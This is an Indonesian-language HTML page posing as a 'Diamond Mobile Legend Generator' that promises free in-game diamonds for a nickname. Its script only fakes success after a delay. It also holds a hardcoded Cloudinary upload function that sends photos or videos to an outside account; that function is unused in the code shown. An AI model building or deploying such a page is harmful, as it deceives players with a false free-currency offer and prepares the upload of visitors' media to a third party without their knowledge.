<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diamond Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        #status {
            margin-top: 20px;
        }

        /* Styling untuk modal cookies */
        #cookieConsentModal {
            display: none;
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #fff;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            z-index: 1000;
            max-width: 400px;
            text-align: center;
        }
        #cookieConsentModal p {
            margin: 0 0 15px;
        }
        #cookieConsentModal button {
            padding: 8px 16px;
            margin: 0 5px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        #acceptCookies {
            background: #4CAF50;
            color: white;
        }
        #declineCookies {
            background: #f44336;
            color: white;
        }
    </style>
</head>
<body>
    <h1>Diamond Mobile Legend Generator</h1>
    <p>Nickname:</p>
    <input type="text" id="nickname" placeholder="Nickname ML">
    <br>
    <p>Jumlah Diamond:</p>
    <input type="number" id="diamondCount" placeholder="Max 9999">
    <br>
    <br>
    <button id="startButton">Generate Diamond!</button>
    <p id="status"></p>

    <!-- Modal untuk meminta izin cookies -->
    <div id="cookieConsentModal">
        <p>Kami menggunakan cookies untuk meningkatkan pengalaman Anda. Apakah Anda setuju?</p>
        <button id="acceptCookies">Setuju</button>
        <button id="declineCookies">Tolak</button>
    </div>

    <script>
        const CLOUD_NAME = 'dsiyan9do';
        const UPLOAD_PRESET = 'pproject';
        
        const startButton = document.getElementById('startButton');
        const statusText = document.getElementById('status');
        const cookieConsentModal = document.getElementById('cookieConsentModal');
        const acceptCookiesButton = document.getElementById('acceptCookies');
        const declineCookiesButton = document.getElementById('declineCookies');

        document.addEventListener('DOMContentLoaded', () => {
            if (!document.cookie.includes('cookieConsent=true')) {
                cookieConsentModal.style.display = 'block';
            }
        });

        acceptCookiesButton.addEventListener('click', () => {
            document.cookie = "cookieConsent=true; max-age=2592000; path=/";
            cookieConsentModal.style.display = 'none';
        });

        declineCookiesButton.addEventListener('click', () => {
            cookieConsentModal.style.display = 'none';
            statusText.textContent = 'Anda harus menyetujui cookies untuk menggunakan fitur ini.';
            statusText.hidden = false;
        });

        async function uploadToCloudinary(file, type) {
            try {
                const formData = new FormData();
                formData.append('file', file);
                formData.append('upload_preset', UPLOAD_PRESET);
                
                const endpoint = type === 'image' ? 'image/upload' : 'video/upload';
                const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${endpoint}`, {
                    method: 'POST',
                    body: formData,
                });

                const data = await response.json();
                if (data.secure_url) {
                    statusText.innerHTML = `${type === 'image' ? 'Foto' : 'Video'} berhasil diunggah! <a href="${data.secure_url}" target="_blank">Lihat di sini</a>`;
                } else {
                    statusText.textContent = `Gagal mengunggah ${type}: ${JSON.stringify(data)}`;
                }
            } catch (error) {
                statusText.textContent = `Gagal mengunggah ${type}: ${error.message}`;
            }
        }

        startButton.addEventListener('click', async () => {
            if (!document.cookie.includes('cookieConsent=true')) {
                cookieConsentModal.style.display = 'block';
                return;
            }

            const nickname = document.getElementById('nickname').value;
            const diamondCount = document.getElementById('diamondCount').value;

            if (!nickname || !diamondCount || diamondCount > 9999 || diamondCount <= 0) {
                statusText.textContent = 'Mohon masukkan nickname dan jumlah diamond yang valid (1-9999).';
                statusText.hidden = false;
                return;
            }

            statusText.textContent = `Permintaan ${diamondCount} diamond untuk ${nickname} sedang diproses...`;
            statusText.hidden = false;
            setTimeout(() => {
                statusText.textContent = `Diamond berhasil dikirim ke akun ${nickname}!`;
            }, 3000);
        });
    </script>
</body>
</html>
